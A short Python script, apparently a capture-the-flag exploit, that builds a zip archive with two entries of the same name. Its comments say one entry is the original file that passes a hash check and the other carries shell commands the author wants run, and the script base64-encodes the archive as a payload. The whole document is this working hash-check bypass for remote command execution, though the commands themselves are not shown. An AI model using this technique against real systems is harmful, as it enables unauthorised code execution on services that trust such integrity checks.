import zipfile
import base64

with zipfile.ZipFile('commands.zip', mode='w') as zip_archive:
    # contains the original file that will pass the hash check
    zip_archive.write('md5/commands/command.txt', arcname='./commands/command.txt')
    # contains the shell commands we wanna run
    zip_archive.write('pwn/commands/command.txt', arcname='./commands/command.txt')

    # payload
with open('commands.zip', 'rb') as f:
    print(base64.b64encode(f.read()))